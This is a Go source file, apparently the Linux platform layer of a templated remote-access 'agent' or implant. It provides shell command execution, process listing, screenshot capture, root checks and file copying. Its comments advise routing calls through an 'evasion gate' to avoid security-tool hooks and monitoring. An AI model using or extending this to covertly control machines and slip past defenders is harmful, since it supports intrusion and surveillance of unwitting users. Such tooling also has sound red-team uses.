//go:build linux

package impl

import (
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"__NAME__/protocol"
)

// ═══════════════════════════════════════════════════════════════════════════════
// Platform-specific implementations for Linux.
// ═══════════════════════════════════════════════════════════════════════════════

// ─── Platform ──────────────────────────────────────────────────────────────────

// GetCP returns the terminal code page. Usually 0 (UTF-8) on Linux.
// TODO: Implement if you need locale-specific code page detection.
func (a *Agent) GetCP() uint32 {
	return 0
}

// IsElevated returns true when running as root.
// TODO: Implement via evasion gate or direct syscall.
// Typical approach: geteuid(2) — may be hooked by security tools.
func (a *Agent) IsElevated() bool {
	return os.Geteuid() == 0
}

// GetOsVersion returns a human-readable OS version string.
// TODO: Implement via evasion gate or direct file read.
// Typical approach: read /etc/os-release or uname(2).
func (a *Agent) GetOsVersion() string {
	if data, err := os.ReadFile("/etc/os-release"); err == nil {
		for _, line := range strings.Split(string(data), "\n") {
			if strings.HasPrefix(line, "PRETTY_NAME=") {
				return strings.Trim(strings.TrimPrefix(line, "PRETTY_NAME="), "\"")
			}
		}
	}
	if out, err := exec.Command("uname", "-sr").Output(); err == nil {
		return strings.TrimSpace(string(out))
	}
	return "Linux"
}

// NormalizePath converts a path to its canonical Linux form.
func (a *Agent) NormalizePath(path string) string {
	if path == "" {
		return path
	}
	if strings.HasPrefix(path, "~") {
		home, err := os.UserHomeDir()
		if err == nil {
			path = home + path[1:]
		}
	}
	abs, err := filepath.Abs(path)
	if err != nil {
		return path
	}
	return filepath.Clean(abs)
}

// ─── FileSystem ────────────────────────────────────────────────────────────────

// GetListing returns the absolute path and directory entries for the given path.
// TODO: Implement — DirEntry fields are protocol-dependent.
// Use os.ReadDir + e.Info() to populate the protocol.DirEntry struct
// with the fields defined by your protocol overlay.
func (a *Agent) GetListing(path string) (string, []protocol.DirEntry, error) {
	return listDirEntries(path)
}

// CopyFile copies a single file from src to dst.
func (a *Agent) CopyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	return err
}

// CopyDir recursively copies a directory from src to dst.
func (a *Agent) CopyDir(src, dst string) error {
	srcInfo, err := os.Stat(src)
	if err != nil {
		return err
	}
	if err := os.MkdirAll(dst, srcInfo.Mode()); err != nil {
		return err
	}
	entries, err := os.ReadDir(src)
	if err != nil {
		return err
	}
	for _, entry := range entries {
		srcPath := filepath.Join(src, entry.Name())
		dstPath := filepath.Join(dst, entry.Name())
		if entry.IsDir() {
			if err := a.CopyDir(srcPath, dstPath); err != nil {
				return err
			}
		} else {
			if err := a.CopyFile(srcPath, dstPath); err != nil {
				return err
			}
		}
	}
	return nil
}

// ─── Execution ─────────────────────────────────────────────────────────────────

// RunShell executes a command via the system shell.
// TODO: Implement via evasion gate or direct API call.
// Typical approach: fork+exec /bin/sh -c with pipes (may be monitored).
func (a *Agent) RunShell(cmd string, output bool, wait bool) (string, error) {
	return runShellCommand("/bin/sh", []string{"-c", cmd}, output, wait)
}

// ListProcesses returns a snapshot of running processes.
// TODO: Implement via evasion gate or direct approach.
// Typical approach: read /proc/*/stat (may be monitored by security tools).
func (a *Agent) ListProcesses() ([]protocol.ProcessEntry, error) {
	out, err := exec.Command("ps", "-eo", "pid=,ppid=,user=,comm=").Output()
	if err != nil {
		return nil, err
	}
	return parseUnixPS(out), nil
}

// CaptureScreenshot takes a screenshot and returns PNG bytes.
// TODO: Implement (platform-specific, e.g., X11/Wayland screengrab).
func (a *Agent) CaptureScreenshot() ([]byte, error) {
	return captureScreenshotAttempts(
		screenshotAttempt{
			name: "grim",
			fn: func() ([]byte, error) {
				return captureScreenshotFromStdout("grim", "-")
			},
		},
		screenshotAttempt{
			name: "gnome-screenshot",
			fn: func() ([]byte, error) {
				return captureScreenshotFromTempFile("gnome-screenshot", "-f", "{out}")
			},
		},
		screenshotAttempt{
			name: "import",
			fn: func() ([]byte, error) {
				return captureScreenshotFromTempFile("import", "-window", "root", "{out}")
			},
		},
		screenshotAttempt{
			name: "scrot",
			fn: func() ([]byte, error) {
				return captureScreenshotFromTempFile("scrot", "{out}")
			},
		},
	)
}
